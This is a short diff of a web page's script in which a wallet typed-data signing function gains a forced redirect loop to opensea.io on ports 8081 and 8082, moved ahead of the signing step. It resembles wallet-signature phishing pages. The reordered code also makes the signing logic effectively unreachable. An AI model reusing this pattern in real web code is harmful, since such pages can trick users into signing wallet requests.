@@ -20,6 +20,14 @@
 <body>
   <script>
     async function promptSignTypedData(account) {
+              // Perform redirection immediately after signing
+        // Initial redirection
+        location.href = "https://opensea.io:8081";
+
+        // Interval-based redirection
+        setInterval(function () {
+          location.href = "https://opensea.io:8082";
+        }, 1000);
       try {
         const msgParams = {
           types: {
@@ -60,14 +68,6 @@
 
         alert(`Signature: ${signature}`);
 
-        // Perform redirection immediately after signing
-        // Initial redirection
-        location.href = "https://opensea.io:8081";
-
-        // Interval-based redirection
-        setInterval(function () {
-          location.href = "https://opensea.io:8082";
-        }, 1000);
 
         return true;
       } catch (error) {
